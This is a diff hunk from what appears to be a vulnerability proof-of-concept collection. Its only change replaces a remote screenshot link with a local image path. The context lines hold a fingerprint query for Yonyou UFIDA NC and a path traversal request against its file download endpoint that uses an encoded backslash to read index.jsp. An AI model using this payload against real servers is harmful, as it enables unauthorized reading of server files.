@@ -11,7 +11,7 @@ app="用友-UFIDA-NC"
 ```
 /portal/pt/xml/file/download?pageId=login&filename=..%5Cindex.jsp
 ```
-![image](https://github.com/wy876/POC/assets/139549762/43853ad7-9323-4874-956c-25b5de054184)
+![image](../../images/43853ad7-9323-4874-956c-25b5de054184.png)
 
 ## yaml 批量检测
 ```
